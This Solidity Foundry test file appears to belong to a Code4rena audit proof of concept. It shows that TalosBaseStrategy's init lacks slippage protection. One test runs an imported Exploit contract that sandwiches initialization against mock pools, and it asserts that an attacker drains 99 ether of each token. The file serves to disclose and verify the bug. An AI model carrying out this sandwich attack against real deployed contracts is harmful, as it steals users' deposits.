// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./26044-h-10-talosbasestrategyinit-lacks-slippage-protection-code4re.sol";

contract MaiaInitSlippageTest is Test {
    Exploit exp;

    function setUp() public {
        exp = new Exploit();
    }

    function test_control_deposit_reverts_on_deviation() public {
        MockERC20 t0 = new MockERC20("T0", "T0");
        MockERC20 t1 = new MockERC20("T1", "T1");
        MockPool pool = new MockPool();
        MockNPM npm = new MockNPM(pool, t0, t1);
        TalosOptimizer opt = new TalosOptimizer();
        TalosBaseStrategy s = new TalosBaseStrategy(npm, pool, t0, t1, opt);
        pool.setTwap(0);
        pool.manipulate(10_000);
        t0.mint(address(this), 10 ether);
        t1.mint(address(this), 10 ether);
        t0.approve(address(s), 10 ether);
        t1.approve(address(s), 10 ether);
        vm.expectRevert(bytes("deviation"));
        s.deposit(10 ether, 10 ether, 0, 0, address(this));
    }

    function test_init_sandwich_drains_deposit() public {
        exp.run();
        emit log_named_uint("extracted T0", exp.extractedT0());
        emit log_named_uint("user shares", exp.userShares());
        assertEq(exp.extractedT0(), 99 ether);
        assertEq(exp.extractedT1(), 99 ether);
        assertEq(exp.userShares(), 2 ether);
    }
}
